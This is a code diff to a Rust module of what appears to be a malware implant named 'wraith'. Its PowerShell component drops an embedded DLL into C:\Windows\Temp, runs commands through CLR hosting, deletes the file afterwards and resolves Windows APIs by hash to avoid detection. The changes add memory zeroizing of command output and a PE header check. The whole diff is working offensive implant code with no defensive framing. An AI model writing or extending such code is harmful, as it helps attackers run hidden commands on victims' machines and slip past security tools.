@@ -1,5 +1,5 @@
-use alloc::vec::Vec;
 use alloc::format;
+use crate::utils::sensitive::SensitiveData;
 
 #[cfg(target_os = "windows")]
 use crate::modules::clr::ClrHost;
@@ -16,7 +16,7 @@ pub struct PowerShell;
 const RUNNER_DLL: &[u8] = include_bytes!("../../resources/Runner.dll");
 
 impl PowerShell {
-    pub fn exec(&self, cmd: &str) -> Vec<u8> {
+    pub fn exec(&self, cmd: &str) -> SensitiveData {
         #[cfg(target_os = "windows")]
         {
             let path = "C:\\Windows\\Temp\\wraith_ps.dll";
@@ -32,11 +32,17 @@ impl PowerShell {
                     let _ = unsafe { self.delete_runner(path) };
                     
                     match res {
-                        Ok(exit_code) => format!("Executed via CLR. Exit code: {}", exit_code).into_bytes(),
-                        Err(_) => b"CLR Execution Failed".to_vec()
+                        Ok(exit_code) => {
+                            let s = format!("Executed via CLR. Exit code: {}", exit_code);
+                            let mut v = s.into_bytes();
+                            let sd = SensitiveData::new(&v);
+                            v.zeroize();
+                            sd
+                        },
+                        Err(_) => SensitiveData::new(b"CLR Execution Failed")
                     }
                 },
-                Err(_) => b"Failed to drop runner".to_vec()
+                Err(_) => SensitiveData::new(b"Failed to drop runner")
             }
         }
 
@@ -48,6 +54,14 @@ impl PowerShell {
 
     #[cfg(target_os = "windows")]
     unsafe fn drop_runner(&self, path: &str) -> Result<(), ()> {
+        // Verify we have a valid PE header (minimal check)
+        if RUNNER_DLL.len() < 1024 { // Real .NET DLLs are larger than 1KB
+             return Err(());
+        }
+        if RUNNER_DLL[0] != 0x4D || RUNNER_DLL[1] != 0x5A { // MZ
+             return Err(());
+        }
+
         let kernel32_hash = hash_str(b"kernel32.dll");
         let create_file_hash = hash_str(b"CreateFileA");
         let write_file_hash = hash_str(b"WriteFile");
